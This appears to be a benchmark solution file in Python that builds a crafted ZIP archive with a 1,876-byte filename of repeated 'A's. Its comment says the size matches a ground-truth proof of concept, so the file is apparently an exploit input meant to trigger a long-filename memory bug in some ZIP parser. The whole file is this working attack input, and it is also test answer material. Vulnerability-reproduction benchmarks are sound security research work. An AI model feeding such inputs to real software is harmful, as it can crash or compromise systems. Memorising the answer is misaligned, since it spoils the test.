import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        n = 1876  # filename length to match ground-truth PoC size
        filename = b"A" * n

        # Local file header
        lfh = struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50,  # Signature
            10,          # Version needed to extract
            0,           # General purpose bit flag
            0,           # Compression method (store)
            0,           # Last mod file time
            0,           # Last mod file date
            0,           # CRC-32
            0,           # Compressed size
            0,           # Uncompressed size
            n,           # File name length
            0            # Extra field length
        )

        local_header_offset = 0
        central_dir_offset = len(lfh) + len(filename)  # No file data

        # Central directory file header
        cdfh = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            0x02014B50,       # Signature
            20,               # Version made by
            10,               # Version needed to extract
            0,                # General purpose bit flag
            0,                # Compression method
            0,                # Last mod time
            0,                # Last mod date
            0,                # CRC-32
            0,                # Compressed size
            0,                # Uncompressed size
            n,                # File name length
            0,                # Extra field length
            0,                # File comment length
            0,                # Disk number start
            0,                # Internal file attributes
            0,                # External file attributes
            local_header_offset  # Relative offset of local header
        )

        central_dir_size = len(cdfh) + len(filename)

        # End of central directory record
        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,        # Signature
            0,                 # Number of this disk
            0,                 # Disk where central directory starts
            1,                 # Number of central directory records on this disk
            1,                 # Total number of central directory records
            central_dir_size,  # Size of central directory
            central_dir_offset,# Offset of start of central directory
            0                  # ZIP file comment length
        )

        return lfh + filename + cdfh + filename + eocd